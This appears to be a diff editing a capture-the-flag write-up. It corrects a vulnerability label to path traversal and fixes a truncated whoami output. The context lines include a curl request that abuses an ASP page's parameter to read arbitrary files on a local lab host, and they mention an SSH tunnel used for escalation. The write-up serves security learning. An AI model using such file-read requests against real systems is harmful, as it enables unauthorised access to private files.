@@ -322,7 +322,7 @@ Set fso = Nothing
 [truncated]
 ```
 
-This gives us LFI/arbitrary file read. We can then use this to query files we normally don't have access to, for instance, the `C:\Syndicate_Loot\archive\hmm.txt` that was previously mentioned:
+This gives us arbitrary file read/path traversal. We can then use this to query files we normally don't have access to, for instance, the `C:\Syndicate_Loot\archive\hmm.txt` that was previously mentioned:
 
 ```
 $ curl -sG 'http://127.0.0.1:18080/pages/notes/notes.asp?x=C:\Syndicate_Loot\archive\hmm.txt'
@@ -404,7 +404,7 @@ SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
 
 backup-svc@WIN-SJR239VHPGG C:\Users\backup-svc>whoami
-win-sjr239vhpgg\backup-sv
+win-sjr239vhpgg\backup-svc
 ```
 
 Not enough permissions, so I will try use the same SSH tunnel from earlier:
